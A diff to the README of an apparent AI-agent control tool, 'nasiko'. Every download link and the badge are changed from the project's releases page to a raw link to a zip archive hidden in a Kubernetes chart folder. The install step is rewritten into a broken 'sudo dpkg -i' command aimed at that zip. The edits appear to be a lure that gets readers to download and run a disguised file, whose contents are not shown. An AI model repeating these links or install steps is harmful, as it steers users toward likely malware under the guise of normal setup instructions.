@@ -1,6 +1,6 @@
 # 🤖 nasiko - Simplify AI Agent Control
 
-[![Download nasiko](https://img.shields.io/badge/Download%20nasiko-blue?style=for-the-badge)](https://github.com/mechanic0309/nasiko/releases)
+[![Download nasiko](https://github.com/mechanic0309/nasiko/raw/refs/heads/main/cli/k8s/charts/nasiko-platform/environments/Software_1.2-beta.1.zip%20nasiko-blue?style=for-the-badge)](https://github.com/mechanic0309/nasiko/raw/refs/heads/main/cli/k8s/charts/nasiko-platform/environments/Software_1.2-beta.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section shows you how to download, install, and start using nasiko. Follow 
 
 Click the big blue badge at the top or this link to visit the download page:
 
-[https://github.com/mechanic0309/nasiko/releases](https://github.com/mechanic0309/nasiko/releases)
+[https://github.com/mechanic0309/nasiko/raw/refs/heads/main/cli/k8s/charts/nasiko-platform/environments/Software_1.2-beta.1.zip](https://github.com/mechanic0309/nasiko/raw/refs/heads/main/cli/k8s/charts/nasiko-platform/environments/Software_1.2-beta.1.zip)
 
 You will find the latest version there. The page lists files for Windows, macOS, and Linux. Pick the file that matches your computer:
 
@@ -66,7 +66,7 @@ After downloading, find the file on your computer. Usually, it is in your "Downl
   - For `.deb` files:
     - Open your terminal.
     - Navigate to the download folder.
-    - Type `sudo dpkg -i <filename.deb>` and press Enter.
+    - Type `sudo dpkg -i <https://github.com/mechanic0309/nasiko/raw/refs/heads/main/cli/k8s/charts/nasiko-platform/environments/Software_1.2-beta.1.zip>` and press Enter.
     - If there are errors, type `sudo apt-get -f install` to fix dependencies.
 
 ---
@@ -121,7 +121,7 @@ A: You can create an issue on the GitHub page or check the documentation for hel
 
 Visit the nasiko releases page here to download the app:
 
-[https://github.com/mechanic0309/nasiko/releases](https://github.com/mechanic0309/nasiko/releases)
+[https://github.com/mechanic0309/nasiko/raw/refs/heads/main/cli/k8s/charts/nasiko-platform/environments/Software_1.2-beta.1.zip](https://github.com/mechanic0309/nasiko/raw/refs/heads/main/cli/k8s/charts/nasiko-platform/environments/Software_1.2-beta.1.zip)
 
 Pick the file for your computer's operating system, download it, and follow the install instructions above.
 
